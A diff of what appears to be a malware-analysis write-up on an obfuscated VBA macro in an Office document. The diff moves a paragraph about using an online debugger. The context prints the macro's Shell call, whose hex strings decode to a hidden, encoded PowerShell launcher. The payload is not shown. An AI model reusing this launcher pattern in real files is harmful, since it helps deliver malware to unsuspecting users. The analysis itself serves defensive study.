@@ -17,10 +17,6 @@ A malicious code (generally in VBA) can be hidden inside these files.
 
 As I scroll through, I only see random function and variable names and it was obvious that the code was obfuscated. You can find the original file [here](sources/original.txt). I replaced the random variable and function names to more readable format. You can find the readable file [here](macro.txt).
 
->Now I tried to debug the code using an online debugger ([tutorialspoint.com](https://www.tutorialspoint.com/compile_vb.net_online.php)), then I printed the final command that was to be executed :
-
-![online_debug](images/S1[0].jpg)
-
 ```v
 x = Shell(some_func("50") & 
 some_func("4f5745525348454c4c2e6578") & 
@@ -28,6 +24,11 @@ some_func("65202d6e6f65786974202d772068696464") &
 some_func("656e202d656e6320") & 
 str1 & str2 & str3 & str4, 1)
 ```
+
+>Now I tried to debug the code using an online debugger ([tutorialspoint.com](https://www.tutorialspoint.com/compile_vb.net_online.php)), then I printed the final command that was to be executed :
+
+![online_debug](images/S1[0].jpg)
+
 After decoding this I got this huge statement :
 
 ```powershell
